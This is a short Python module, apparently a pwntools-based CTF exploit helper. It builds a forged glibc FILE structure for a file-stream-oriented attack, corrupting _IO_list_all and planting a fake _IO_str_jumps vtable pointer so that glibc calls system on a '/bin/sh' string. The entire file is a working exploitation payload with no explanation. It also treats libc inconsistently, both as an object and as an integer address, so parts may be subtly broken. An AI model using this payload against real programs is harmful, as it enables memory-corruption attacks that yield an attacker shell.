#!/usr/bin/env python
# -*- coding: utf-8 -*-
from .structs import pack_file
from pwn import p16, p32, p64


def IO_file_finish_payload(libc, _IO_str_jumps_addr, system_addr, binsh_addr):
    payload = pack_file(
        _flags=0,
        _IO_read_ptr=0x61,
        _IO_read_base=libc.sym["_IO_list_all"] - 0x10,
        _IO_write_base=0,
        _IO_write_ptr=1,
        _IO_buf_base=binsh_addr,
        _mode=0x7FFFFFFF,
        _wide_data=0x1EB880 + libc,
    )
    payload += p64(_IO_str_jumps_addr - 8)
    payload += p64(0)
    payload += p64(system_addr)
    return payload
